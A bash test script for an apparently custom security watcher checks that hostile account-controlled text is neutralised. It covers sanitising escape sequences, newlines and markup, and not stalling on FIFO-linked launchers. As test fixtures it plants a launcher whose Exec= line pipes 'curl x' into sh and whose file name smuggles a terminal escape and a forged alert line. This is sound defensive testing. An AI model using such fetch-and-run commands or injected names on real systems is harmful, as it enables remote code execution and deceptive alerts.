#!/usr/bin/bash
# The security watcher against what an account can plant, for 20-tests.sh: text it wrote (here a launcher's
# file name holding a newline, an escape sequence and markup) reaches the history, the unread list, the
# Events page's file, a notification and `--show` only as plain text; a launcher linked to a file that never
# ends cannot keep a run waiting; and every finding carries its facts. Runs as root, as the watcher does,
# against a stand-in /etc/passwd, /var/home, state and logs, with a stand-in for the notification.

set -euo pipefail

WATCH="${1:-/usr/libexec/amethystora-security-watch}"
TEXT=/usr/libexec/amethystora-security-text
T="$(realpath "$(mktemp -d)")"
trap 'rm -rf "${T}"' EXIT
chmod 0755 "${T}"
fail() { echo "test-security-watch: $*" >&2; exit 1; }
ESC=$'\e'

# --- The text filter on its own -------------------------------------------------------------------------

out="$("${TEXT}" "a${ESC}]0;title${ESC}\\b"$'\n'"c"$'\r'"d"$'\xc2\x9b'"e")"
[[ "${out}" == "a]0;title\\b cde" ]] || fail "control characters, a newline or a C1 character got through: $(printf '%q' "${out}")"
out="$("${TEXT}" --lines $'one\ntwo')"
[[ "${out}" == $'one\ntwo' ]] || fail "--lines did not keep the lines"
out="$("${TEXT}" --markup '<a href="x">&')"
[[ "${out}" == '&lt;a href="x"&gt;&amp;' ]] || fail "--markup: ${out}"
out="$("${TEXT}" --max 5 'abcdefgh')"
[[ "${out}" == 'abcde…' ]] || fail "--max: ${out}"

# --- A watcher run ------------------------------------------------------------------------------------

export AMETHYSTORA_WATCH_ROOT="${T}/root"
export AMETHYSTORA_WATCH_NOTIFY="${T}/notify"
export AMETHYSTORA_SECURITY_CONF="${T}/security.conf"
export AMETHYSTORA_SECURITY_NOTES="${T}/notes"
R="${AMETHYSTORA_WATCH_ROOT}"
# Everything off but what a session finds first, so that the run reads only the stand-in homes
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
AUDIT_LOG=off
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
NETWORK=off
EOF
cat >"${T}/notify" <<EOF
#!/usr/bin/bash
printf '%s\n' "\$@" >"${T}/notified"
EOF
chmod 0755 "${T}/notify"
mkdir -p "${R}/etc" "${R}/var/home/alice/.local/share/applications"
echo "alice:x:4500:4500::${R}/var/home/alice:/bin/bash" >"${R}/etc/passwd"
chown -R 4500:4500 "${R}/var/home/alice"
APPS="${R}/var/home/alice/.local/share/applications"

# The first run only records where things stand
timeout 120 "${WATCH}" >/dev/null || fail "the first run failed"

# A launcher linked to a file that never ends, and one whose name and Exec= are written to deceive
mkfifo "${T}/forever"
ln -s "${T}/forever" "${APPS}/stall.desktop"
ln -s /proc/kmsg "${APPS}/kmsg.desktop"
name="evil${ESC}[2J"$'\n'"Accounts changed: nothing<b>.desktop"
printf '[Desktop Entry]\nExec=sh -c "curl x | sh" <i>%s[31m\n' "${ESC}" >"${APPS}/${name}"
chown -h 4500:4500 "${APPS}/stall.desktop" "${APPS}/kmsg.desktop" "${APPS}/${name}"
timeout 120 "${WATCH}" >/dev/null || fail "a launcher linked to a file that never ends kept the run waiting, or it failed"

HISTORY="${R}/var/log/amethystora-security-events.jsonl"
[[ "$(wc -l <"${HISTORY}")" -eq 1 ]] || fail "the history should hold one finding: $(cat "${HISTORY}")"
jq -e '.level == "normal" and .key == "user-paths" and .account == "alice" and .tactic == "Persistence"
    and (.time | type == "number") and (.text | test("evil") and (test("[\u0001-\u001f\u007f]") | not))' \
    "${HISTORY}" >/dev/null || fail "the finding's facts or text: $(cat "${HISTORY}")"
grep -q "${ESC}" "${R}/var/log/amethystora-security-events.new" && fail "the unread list keeps an escape"
[[ "$(wc -l <"${R}/var/log/amethystora-security-events.new")" -eq 1 ]] || fail "a newline in a name forged a line"
jq -e 'length == 1 and .[0].key == "user-paths"' "${R}/var/lib/amethystora/security/events.json" >/dev/null ||
    fail "events.json"
grep -q "${ESC}" "${T}/notified" && fail "the notification keeps an escape"
grep -q "evil" "${T}/notified" || fail "nothing was notified"
"${WATCH}" --show | grep -q "${ESC}" && fail "--show prints an escape"
jq -e '.timings | has("USER_PATHS")' "${R}/var/lib/amethystora/security/status.json" >/dev/null ||
    fail "status.json has no timings"
[[ "$("${WATCH}" --keys)" == *"|input-capture|"* ]] || fail "--keys"

echo "test-security-watch: what an account plants is only ever read"
